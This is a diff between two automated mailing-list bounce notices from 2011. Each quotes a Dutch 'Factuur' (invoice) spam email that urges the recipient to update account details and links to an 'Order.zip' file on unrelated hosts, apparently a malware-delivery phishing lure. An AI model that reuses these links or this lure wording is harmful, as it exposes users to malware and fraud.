@@ -1,9 +1,10 @@
-From: postmaster-DMvgxKAs6cU@public.gmane.org
-Subject: Delivery Status Notification (Failure)
-Date: Tue, 15 Nov 2011 19:46:46 +0100
-Message-ID: <lI6X610Co0000d06b@smtp.paard.nl>
+From: Mail Delivery System <Mailer-Daemon-95N5ItBNkBPqAUHrpADhqmZy7eGcjJgl@public.gmane.org>
+Subject: Mail delivery failed: returning message to sender
+Date: Tue, 15 Nov 2011 18:44:03 +0000
+Message-ID: <E1RQNzH-0004oG-LQ@mail5.atlas.pipex.net>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============8170750233832939604=="
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -17,98 +18,61 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This is a MIME-formatted message.  
-Portions of this message may be unreadable without a MIME-capable mail program.
+This message was created automatically by mail delivery software.
 
---===============8170750233832939604==
-Content-Type: multipart/report; report-type=delivery-status;
-	boundary="9B095B5ADSN=_01CB53DABF9471C6000A16C5smtp.paard.nl"
+A message that you sent could not be delivered to one or more of its
+recipients. This is a permanent error. The following address(es) failed:
 
-This is a MIME-formatted message.  
-Portions of this message may be unreadable without a MIME-capable mail program.
+  wjbz-B0qZmFHriGg@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<wjbz-B0qZmFHriGg@public.gmane.org>:
+    host smtp3.dds.nl [85.17.178.153]: 550 5.1.1 <wjbz-B0qZmFHriGg@public.gmane.org>:
+    Recipient address rejected: User unknown in local recipient table
+  wjblack-B0qZmFHriGg@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<wjblack-B0qZmFHriGg@public.gmane.org>:
+    host smtp3.dds.nl [85.17.178.153]: 550 5.1.1 <wjblack-B0qZmFHriGg@public.gmane.org>:
+    Recipient address rejected: User unknown in local recipient table
+  wjb-B0qZmFHriGg@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<wjb-B0qZmFHriGg@public.gmane.org>:
+    host smtp3.dds.nl [85.17.178.153]: 550 5.1.1 <wjb-B0qZmFHriGg@public.gmane.org>:
+    Recipient address rejected: User unknown in local recipient table
+  wja-veen-B0qZmFHriGg@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<wja-veen-B0qZmFHriGg@public.gmane.org>:
+    host smtp3.dds.nl [85.17.178.153]: 550 5.1.1 <wja-veen-B0qZmFHriGg@public.gmane.org>:
+    Recipient address rejected: User unknown in local recipient table
 
---9B095B5ADSN=_01CB53DABF9471C6000A16C5smtp.paard.nl
-Content-Type: text/plain; charset=unicode-1-1-utf-7
+------ This is a copy of the message, including all the headers. ------
 
-This is an automatically generated Delivery Status Notification.
-
-Delivery to the following recipients failed.
-
-       glitterpaty-DMvgxKAs6cU@public.gmane.org
-
-
-
-
---9B095B5ADSN=_01CB53DABF9471C6000A16C5smtp.paard.nl
-Content-Type: message/delivery-status
-
-Reporting-MTA: dns;smtp.paard.nl
-Received-From-MTA: dns;aspmail.atinet.nl
-Arrival-Date: Tue, 15 Nov 2011 19:46:45 +0100
-
-Final-Recipient: rfc822;glitterpaty-DMvgxKAs6cU@public.gmane.org
-Action: failed
-Status: 5.1.1
-
---9B095B5ADSN=_01CB53DABF9471C6000A16C5smtp.paard.nl
-Content-Type: message/rfc822
-
-Received: from aspmail.atinet.nl ([81.23.229.92]) by smtp.paard.nl with Microsoft SMTPSVC(6.0.3790.3959);
-	 Tue, 15 Nov 2011 19:46:45 +0100
-X-ASG-Debug-ID: 1321382804-5321b8d10001-FHh55d
-Received: from uspro545.startdedicated.com (uspro545.startdedicated.com [173.224.125.98]) by aspmail.atinet.nl with ESMTP id gk0xvJ2FvamGjIeu for <glitterpaty-DMvgxKAs6cU@public.gmane.org>; Tue, 15 Nov 2011 19:46:44 +0100 (CET)
-X-Barracuda-Envelope-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-X-Barracuda-Apparent-Source-IP: 173.224.125.98
-Received: from [173.224.125.98] by uspro545.startdedicated.com id bLb7fZx9oTe2 with SMTP; Tue, 15 Nov 2011 18:46:39 +0000
-Date: Tue, 15 Nov 2011 18:46:39 +0000
-From: "OrderCo" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v4.3.58.2) Educational
+Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from static.99.74.4.46.clients.your-server.de ([46.4.74.99] helo=myoroclean.domain.de)
+	by mail5.atlas.pipex.net with esmtpa (Exim 4.71)
+	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
+	id 1RQNym-0004ME-HM; Tue, 15 Nov 2011 18:43:32 +0000
+Received: from [46.4.74.99] by myoroclean.domain.de id 7x5eZcQKy17i with SMTP; Tue, 15 Nov 2011 19:54:14 +0100
+Date: Tue, 15 Nov 2011 19:54:14 +0100
+From: "Billing" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v3.7.27.2) Home
 X-Priority: 3 (Normal)
-Message-ID: <44837728.89543159741597-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
-To: <glitterpaty-DMvgxKAs6cU@public.gmane.org>
-Subject: Factuur 017539-784456
+Message-ID: <099630088.35526282612629-lsYetlmOafdBoFUHns3esWfrygkm6VTR@public.gmane.org>
+To: <wjansen-B0qZmFHriGg@public.gmane.org>
+Subject: Factuur 017257-446544
 MIME-Version: 1.0
-X-ASG-Orig-Subj: Factuur 017539-784456
 Content-Type: text/plain;
 	charset="windows-1252"
-X-Barracuda-Connect: uspro545.startdedicated.com[173.224.125.98]
-X-Barracuda-Start-Time: 1321382804
-X-Barracuda-URL: http://81.23.229.92:80/cgi-mod/mark.cgi
-X-Virus-Scanned: by bsmtpd at atinet.nl
-X-Barracuda-Spam-Score: 0.85
-X-Barracuda-Spam-Status: No, SCORE=0.85 using per-user scores of TAG_LEVEL=1000.0 QUARANTINE_LEVEL=6.0 KILL_LEVEL=7.0 tests=FORGED_MUA_THEBAT_CS
-X-Barracuda-Spam-Report: Code version 3.2, rules version 3.2.2.80338
-	Rule breakdown below
-	 pts rule name              description
-	---- ---------------------- --------------------------------------------------
-	0.85 FORGED_MUA_THEBAT_CS   Mail pretending to be from The Bat! (charset)
-Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-X-OriginalArrivalTime: 15 Nov 2011 18:46:46.0021 (UTC) FILETIME=[ECE56350:01CCA3C6]
-Content-Transfer-Encoding: quoted-printable
+Content-Transfer-Encoding: 8bit
+X-Mailcore-Auth: 6699156
+X-Mailcore-Domain: 609085
 
 
 
+
+Goedendag, wjansen.
+
+
+Sorry voor de vertraging.
 Werk uw accountgegevens.
-http://mmu.ro/clientedown/Order.zip?id:4248564549Generation_user=3Dglitte=
-rpaty-DMvgxKAs6cU@public.gmane.org
-
-____________
-Best regards,=20
-ticket service.
+http://merlin.iglu.cz/clientedown/Order.zip?id:94066893Generation_user=wjansen-B0qZmFHriGg@public.gmane.org
 
 
-
-
---9B095B5ADSN=_01CB53DABF9471C6000A16C5smtp.paard.nl--
-
---===============8170750233832939604==
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
-
-_______________________________________________
-Containers mailing list
-Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============8170750233832939604==--
+==
+Best regards,
+Tel./Fax.: +31 (20) 021 72 54.
